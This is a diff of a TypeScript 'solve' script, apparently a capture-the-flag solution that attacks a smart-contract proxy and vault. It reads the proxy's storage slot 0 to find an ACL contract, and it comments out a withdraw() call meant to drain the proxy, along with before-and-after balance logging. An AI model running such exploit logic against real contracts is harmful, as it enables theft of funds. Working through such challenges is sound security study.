@@ -48,17 +48,7 @@ export const solve = async (exploiter: Sender, proxyAddress: string): Promise<bo
     const beforeBalance = await exploiter.getBalance(proxyAddress, 'ether');
     console.log('proxy balance: ', beforeBalance);
     
-    let vaultAddress = '';
-    {
-        const data = abi.simpleEncode("implementation()");
-        const res = await exploiter.viewContract(proxyAddress, data);
-        vaultAddress = '0x'+res.slice(-40);
-        const vaultBalance = await exploiter.getBalance(vaultAddress, 'ether');
-        console.log('Vault address: ', vaultAddress);
-        console.log('Vault balance: ', vaultBalance);
-    }
-
-    const aclAddress = await exploiter.getStorageAt(vaultAddress, new BN(0));
+    const aclAddress = await exploiter.getStorageAt(proxyAddress, new BN(0));
     const aclBalance = await exploiter.getBalance(aclAddress, 'ether');
     console.log('ACL address: ', aclAddress);
     console.log('ACL balance: ', aclBalance);
@@ -112,20 +102,20 @@ export const solve = async (exploiter: Sender, proxyAddress: string): Promise<bo
         }
     }
     
-    {
-        const data = abi.simpleEncode("balance()");
-        const res = await exploiter.viewContract(proxyAddress, data);
-        console.log('balance:', web3.utils.hexToNumberString(res));
-    }
+    // {
+    //     const data = abi.simpleEncode("balance()");
+    //     const res = await exploiter.viewContract(proxyAddress, data);
+    //     console.log('balance:', web3.utils.hexToNumberString(res));
+    // }
 
-    const data = abi.simpleEncode("withdraw()");
-    const res = await exploiter.callContract(proxyAddress, data, { value: '2000', unit: 'finney'});
-    console.log('withdraw() called:', res);
+    // const data = abi.simpleEncode("withdraw()");
+    // const res = await exploiter.callContract(proxyAddress, data, { value: '2000', unit: 'finney'});
+    // console.log('withdraw() called:', res);
 
-    console.log('exploiter balance: ', await exploiter.balance('ether'));
-    const afterBalance = await exploiter.getBalance(proxyAddress, 'ether');
-    console.log(`====== proxy balance ======`);
-    console.log(' - before: ', beforeBalance);
-    console.log(' - after : ', afterBalance);
+    // console.log('exploiter balance: ', await exploiter.balance('ether'));
+    // const afterBalance = await exploiter.getBalance(proxyAddress, 'ether');
+    // console.log(`====== proxy balance ======`);
+    // console.log(' - before: ', beforeBalance);
+    // console.log(' - after : ', afterBalance);
     return false;
 }
